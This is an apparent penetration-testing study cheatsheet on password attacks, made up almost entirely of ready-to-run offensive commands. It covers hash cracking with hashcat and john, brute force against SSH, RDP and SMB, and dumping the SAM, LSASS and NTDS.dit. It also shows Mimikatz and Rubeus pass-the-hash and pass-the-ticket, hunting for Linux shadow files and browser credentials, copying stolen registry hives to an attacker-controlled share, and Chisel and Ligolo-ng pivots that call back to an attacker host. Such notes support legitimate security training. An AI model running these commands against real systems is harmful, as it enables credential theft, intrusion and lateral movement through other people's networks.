---
title: Module 4 - Password Attacks
tags: [password-attacks, cheatsheet, hashcat, john, credentials, mimikatz, pass-the-hash, pass-the-ticket, pivoting]
---

# Module 4 - Password Attacks

> Attacking and bypassing authentication by compromising passwords across operating systems, applications, and encryption methods.

---

## Summary

Covers the full credential attack lifecycle — from cracking offline hashes to live network brute-force to dumping credentials from Windows memory, then using those credentials laterally across a network.

| Phase | Techniques |
|-------|-----------|
| **Cracking** | Dictionary, rules, mask, combinator attacks — John the Ripper & Hashcat |
| **File/Archive** | ssh2john, office2john, zip2john, bitlocker2john |
| **Network Services** | Hydra, NetExec — SSH, SMB, WinRM, RDP brute force |
| **Windows Creds** | SAM/SYSTEM/SECURITY hive dump → secretsdump; LSASS dump → pypykatz/Mimikatz |
| **Active Directory** | NTDS.dit dump via VSS/ntdsutil/secretsdump; Kerbrute user enum |
| **Credential Hunting** | LaZagne, findstr, mimipenguin, firefox_decrypt, Snaffler, MANSPIDER |
| **Lateral Movement** | Pass the Hash (PtH), Pass the Ticket (PtT), OverPass the Hash |
| **Pivoting** | SSH SOCKS proxy, Chisel reverse SOCKS, Ligolo-ng |

**Key tools:** `hashcat`, `john`, `hydra`, `netexec`, `mimikatz`, `pypykatz`, `impacket-secretsdump`, `evil-winrm`, `Rubeus`, `chisel`, `ligolo-ng`

---

## Key Commands

### Password Cracking

```bash
# John the Ripper
john --wordlist=rockyou.txt hash.txt
john --incremental hash.txt
john --single passwd

# Hashcat
hashcat -a 0 -m 1000 hashes.txt rockyou.txt              # NTLM dictionary
hashcat -a 0 -m 0 hash.txt rockyou.txt -r best64.rule    # with rules
hashcat -a 3 -m 0 hash.txt '?u?l?l?l?l?d?s'             # mask attack

# Identify hashes
hashid -j <hash>
hashid -m <hash>
```

### File/Archive Cracking

```bash
ssh2john.py SSH.private > ssh.hash && john --wordlist=rockyou.txt ssh.hash
office2john.py file.docx > file.hash && john --wordlist=rockyou.txt file.hash
pdf2john.py file.pdf > file.hash && john --wordlist=rockyou.txt file.hash
zip2john file.zip > zip.hash && john --wordlist=rockyou.txt zip.hash
bitlocker2john -i drive.vhd > drive.hashes
hashcat -a 0 -m 22100 '<bitlocker_hash>' rockyou.txt
```

### Network Services

```bash
netexec winrm <IP> -u users.txt -p passwords.txt
netexec smb <IP> -u users.txt -p passwords.txt
hydra -L users.txt -P passwords.txt ssh://<IP>
hydra -L users.txt -P passwords.txt rdp://<IP>
hydra -L users.txt -P passwords.txt smb://<IP>
evil-winrm -i <IP> -u <user> -p <pass>
```

### SAM / SYSTEM / LSASS

```bash
# Save registry hives
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# Dump hashes (offline)
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# LSASS dump → extract
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
pypykatz lsa minidump lsass.dmp

# Remote dump
netexec smb <IP> --local-auth -u <user> -p <pass> --sam
netexec smb <IP> --local-auth -u <user> -p <pass> --lsa
```

### Active Directory / NTDS

```bash
kerbrute userenum --dc <IP> --domain <domain> users.txt
netexec smb <DC-IP> -u <user> -p wordlist.txt              # brute force
evil-winrm -i <DC-IP> -u <user> -p <pass>
vssadmin CREATE SHADOW /For=C:                             # VSS on DC
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
netexec smb <IP> -u <user> -p <pass> -M ntdsutil
```

### Pass the Hash

```bash
# Mimikatz (Windows)
mimikatz # sekurlsa::pth /user:<user> /rc4:<hash> /domain:<domain> /run:cmd.exe

# Impacket (Linux)
impacket-psexec administrator@<IP> -hashes :<hash>
netexec smb <IP> -u Administrator -d . -H <hash>
evil-winrm -i <IP> -u Administrator -H <hash>
xfreerdp /v:<IP> /u:<user> /pth:<hash>
```

### Pass the Ticket

```bash
# Export tickets
mimikatz # sekurlsa::tickets /export
Rubeus.exe dump /nowrap

# OverPass the Hash → TGT
mimikatz # sekurlsa::ekeys
Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<key> /nowrap

# Pass the ticket
Rubeus.exe ptt /ticket:<base64 or .kirbi>
mimikatz # kerberos::ptt "<path\to\ticket.kirbi>"

# Linux PtT (ccache)
export KRB5CCNAME=/tmp/krb5cc_<id>
proxychains impacket-wmiexec dc01 -k
```

### Pivoting

```bash
# SSH SOCKS proxy
ssh -D 1080 -N user@<pivot>
# proxychains.conf: socks5 127.0.0.1 1080
proxychains nmap -sT <target>

# Chisel (reverse SOCKS)
chisel server -p 8000 --reverse                             # Kali
chisel.exe client <kali>:8000 R:1080:socks                 # Pivot

# Ligolo-ng
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
ligolo-ng -selfcert -laddr 0.0.0.0:11601
agent.exe -connect <kali>:11601 -ignore-cert
sudo ip route add <internal-subnet>/24 dev ligolo
```

---

## Module Pages

| Topic | File |
|-------|------|
| Password Cracking (JtR & Hashcat) | [password-cracking.md](password-cracking.md) |
| Cracking Files & Archives | [cracking-files-archives.md](cracking-files-archives.md) |
| Network Services | [network-services.md](network-services.md) |
| Windows Credentials (SAM/LSASS/Credential Manager) | [windows-credentials.md](windows-credentials.md) |
| Active Directory & NTDS.dit | [active-directory.md](active-directory.md) |
| Credential Hunting | [credential-hunting.md](credential-hunting.md) |
| Pass the Hash | [pass-the-hash.md](pass-the-hash.md) |
| Pass the Ticket | [pass-the-ticket.md](pass-the-ticket.md) |
| Pivoting | [pivoting.md](pivoting.md) |

---

## All Commands

### Password Cracking — John the Ripper

```bash
# Dictionary attack
john --wordlist=rockyou.txt hash.txt

# Incremental (brute force all chars)
john --incremental hash.txt

# Single mode (uses username/GECOS)
john --single passwd

# Identify what hashes john cracked
john hash.txt --show
```

### Password Cracking — Hashcat

```bash
# Identify hash type
hashid -j <hash>
hashid -m <hash>

# NTLM dictionary
hashcat -a 0 -m 1000 hashes.txt rockyou.txt

# MD5 with rules
hashcat -a 0 -m 0 hash.txt rockyou.txt -r best64.rule

# Mask attack (upper + lower + lower + lower + lower + digit + special)
hashcat -a 3 -m 0 hash.txt '?u?l?l?l?l?d?s'

# DCC2 cached domain creds
hashcat -m 2100 '$DCC2$10240#administrator#<hash>' rockyou.txt

# NTLM from SAM hive
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

# Shadow hashes (sha512crypt)
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

# BitLocker
hashcat -a 0 -m 22100 '<bitlocker_hash>' rockyou.txt
```

### File & Archive Cracking

```bash
ssh2john.py SSH.private > ssh.hash && john --wordlist=rockyou.txt ssh.hash
office2john.py file.docx > file.hash && john --wordlist=rockyou.txt file.hash
pdf2john.py file.pdf > file.hash && john --wordlist=rockyou.txt file.hash
zip2john file.zip > zip.hash && john --wordlist=rockyou.txt zip.hash
bitlocker2john -i drive.vhd > drive.hashes
```

### Network Services Brute Force

```bash
# NetExec
netexec winrm <IP> -u users.txt -p passwords.txt
netexec smb <IP> -u users.txt -p passwords.txt

# Hydra
hydra -L users.txt -P passwords.txt ssh://<IP>
hydra -L users.txt -P passwords.txt rdp://<IP>
hydra -L users.txt -P passwords.txt smb://<IP>

# WinRM shell
evil-winrm -i <IP> -u <user> -p <pass>
```

### Windows Credentials — SAM/SYSTEM/SECURITY

```powershell
# Save registry hives
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# Transfer hives to attacker share
move sam.save \\<attackerIP>\CompData
move security.save \\<attackerIP>\CompData
move system.save \\<attackerIP>\CompData
```

```bash
# Host SMB share on attacker
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py \
  -smb2support CompData /home/ltnbob/Documents/

# Dump hashes offline
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# Remote dump (needs local admin)
netexec smb <IP> --local-auth -u <user> -p <pass> --sam
netexec smb <IP> --local-auth -u <user> -p <pass> --lsa
```

### Windows Credentials — LSASS

```powershell
# Find LSASS PID
tasklist /svc
Get-Process lsass

# Dump LSASS to file
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

```bash
# Extract credentials from dump
pypykatz lsa minidump /home/peter/Documents/lsass.dmp

# Crack extracted NT hash
sudo hashcat -m 1000 <nthash> rockyou.txt
```

```powershell
# Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::credman
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect

# Credential Manager
cmdkey /list
runas /savecred /user:SRV01\mcharles cmd
rundll32 keymgr.dll,KRShowKeyMgr
```

### Active Directory / NTDS.dit

```bash
# User enumeration
kerbrute userenum --dc <IP> --domain <domain> users.txt

# Brute force DC
netexec smb <DC-IP> -u <user> -p wordlist.txt

# Shell into DC
evil-winrm -i <DC-IP> -u <user> -p <pass>
```

```powershell
# Create VSS shadow copy
vssadmin CREATE SHADOW /For=C:
```

```bash
# Dump NTDS.dit offline
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

# Remote via ntdsutil
netexec smb <IP> -u <user> -p <pass> -M ntdsutil
```

### Credential Hunting — Windows

```powershell
# findstr — search files for passwords
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

```bash
# LaZagne
start LaZagne.exe all
```

### Credential Hunting — Linux

```bash
# Config files
for l in $(echo ".conf .config .cnf"); do
  find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done

# Grep credentials inside .cnf files
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib"); do
  grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#"
done

# Bash history
tail -n5 /home/*/.bash*

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*/

# Linux shadow
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

# Memory — mimipenguin
sudo python3 mimipenguin.py

# LaZagne — Linux
sudo python2.7 laZagne.py all
python3 laZagne.py browsers

# Firefox credentials
ls -l .mozilla/firefox/ | grep default
cat .mozilla/firefox/<profile>/logins.json | jq .
python3.9 firefox_decrypt.py

# Auth log grep
for i in $(ls /var/log/* 2>/dev/null); do
  grep "accepted\|session opened\|failure\|failed\|ssh\|sudo\|COMMAND=" $i 2>/dev/null
done
```

### Credential Hunting — Network Shares

```bash
# Snaffler (Windows, domain-joined)
Snaffler.exe -u
Snaffler.exe -i <share>

# MANSPIDER (Linux, Docker)
docker run --rm -v ./manspider:/root/.manspider \
  blacklanternsecurity/manspider <IP> -c 'passw' -u '<user>' -p '<pass>'

# NetExec spider
nxc smb <IP> -u <user> -p '<pass>' --spider <sharename> --content --pattern "passw"
```

```powershell
# PowerHuntShares (Windows)
Set-ExecutionPolicy -Scope Process Bypass
Import-Module .\PowerHuntShares.psm1
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```

### Pass the Hash

```powershell
# Mimikatz — spawn cmd with hash
mimikatz # sekurlsa::pth /user:<user> /rc4:<hash> /domain:<domain> /run:cmd.exe
```

```bash
# Impacket
impacket-psexec administrator@<IP> -hashes :<hash>

# NetExec
netexec smb <IP> -u Administrator -d . -H <hash>

# Evil-WinRM
evil-winrm -i <IP> -u Administrator -H <hash>

# xfreerdp
xfreerdp /v:<IP> /u:<user> /pth:<hash>
```

### Pass the Ticket

```powershell
# Export Kerberos tickets
mimikatz # sekurlsa::tickets /export

# Dump tickets with Rubeus
Rubeus.exe dump /nowrap

# OverPass the Hash → TGT
mimikatz # sekurlsa::ekeys
Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<key> /nowrap

# Inject ticket
Rubeus.exe ptt /ticket:<base64_or_.kirbi>
mimikatz # kerberos::ptt "<path\to\ticket.kirbi>"
```

```bash
# Linux PtT via ccache
export KRB5CCNAME=/tmp/krb5cc_<id>
proxychains impacket-wmiexec dc01 -k
```

### Pivoting

```bash
# SSH SOCKS proxy
ssh -D 1080 -N user@<pivot>
# proxychains.conf: socks5 127.0.0.1 1080
proxychains nmap -sT <target>

# Chisel reverse SOCKS
chisel server -p 8000 --reverse                       # Kali
chisel.exe client <kali>:8000 R:1080:socks            # Pivot host

# Ligolo-ng
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
ligolo-ng -selfcert -laddr 0.0.0.0:11601              # Kali
agent.exe -connect <kali>:11601 -ignore-cert           # Pivot host
sudo ip route add <internal-subnet>/24 dev ligolo
```
